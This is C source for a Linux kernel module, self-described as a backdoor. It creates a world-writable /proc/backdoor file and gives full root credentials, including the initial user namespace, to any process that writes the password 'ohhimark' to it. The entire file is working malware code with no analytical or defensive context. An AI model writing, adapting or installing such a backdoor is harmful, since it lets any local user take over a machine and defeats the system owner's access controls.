#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/uidgid.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Prokhor Arkhipov");
MODULE_DESCRIPTION("backdoor - acquire root using a backdoor");
MODULE_VERSION("0.1");

#define DEVICE_NAME  "backdoor"
#define CLASS_NAME   "backdoor_class"

#define SECRET "ohhimark"
#define SECRET_LEN 8
#define BUF_SIZE 64

static void elevate_privileges(void)
{
    struct cred *new_cred;

    new_cred = prepare_creds();
    if (!new_cred)
        return;

    kuid_t root_uid = make_kuid(&init_user_ns, 0);
    if (!uid_valid(root_uid)) {
        abort_creds(new_cred);
        return;
    }

    new_cred->uid   = root_uid;
    new_cred->euid  = root_uid;
    new_cred->suid  = root_uid;
    new_cred->fsuid = root_uid;

    // глобальный рут
    new_cred->user_ns = &init_user_ns;

    commit_creds(new_cred);
}

static ssize_t backdoor_write(struct file *file, const char __user *ubuf,
                              size_t count, loff_t *ppos)
{
    char kbuf[BUF_SIZE] = {0};
    size_t to_copy = min(count, (size_t)(BUF_SIZE - 1));

    if (copy_from_user(kbuf, ubuf, to_copy))
        return -EFAULT;

    if (memcmp(kbuf, SECRET, SECRET_LEN) == 0) {
        printk(KERN_INFO "backdoor: elevating pid %d\n",
               current->pid);
        elevate_privileges();
    }

    return count;
}

static const struct proc_ops backdoor_ops = {
    .proc_write     = backdoor_write,
};

static int __init backdoor_init(void)
{
    proc_create("backdoor", 0666, NULL, &backdoor_ops);
    printk(KERN_INFO "backdoor: loaded\n");
    return 0;
}

static void __exit backdoor_exit(void)
{
    remove_proc_entry("backdoor", NULL);
    printk(KERN_INFO "backdoor: unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);
